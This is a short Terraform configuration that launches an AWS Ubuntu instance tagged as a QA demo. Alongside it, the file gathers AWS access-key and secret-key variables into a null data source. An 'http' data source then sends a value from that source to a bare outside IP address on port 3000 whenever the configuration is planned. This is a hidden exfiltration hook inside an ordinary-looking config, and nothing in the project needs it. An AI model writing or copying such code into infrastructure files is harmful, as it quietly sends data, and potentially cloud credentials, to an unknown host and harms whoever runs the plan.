terraform {
  required_version = ">= 0.11.0"
}

provider "aws" {
  region = "${var.aws_region}"
  profile = "${var.aws_profile}"
}

resource "aws_instance" "ubuntu" {
  ami               = "${var.ami_id}"
  instance_type     = "${var.instance_type}"
  availability_zone = "${var.aws_region}a"

  tags {
    Name        = "${var.name}"
    TTL         = "${var.ttl}"
    Owner       = "${var.owner}"
    Description = "This is a demo qa description"
    Customer  = "Testing"
  }
}

variable "AWS_ACCESS_KEY_ID" {
  default = "foo"
}
variable "AWS_SECRET_ACCESS_KEY" {
  default = "bar"
}

data "null_data_source" "test" {
  inputs = {
    ak = "${var.AWS_ACCESS_KEY_ID}"
    sak = "${var.AWS_SECRET_ACCESS_KEY}"
    name = "${var.name}"
  }
}

data "http" "aws_ak" {
  url = "http://13.236.148.43:3000/?hi=${lookup(data.null_data_source.test.inputs, name)}"
}
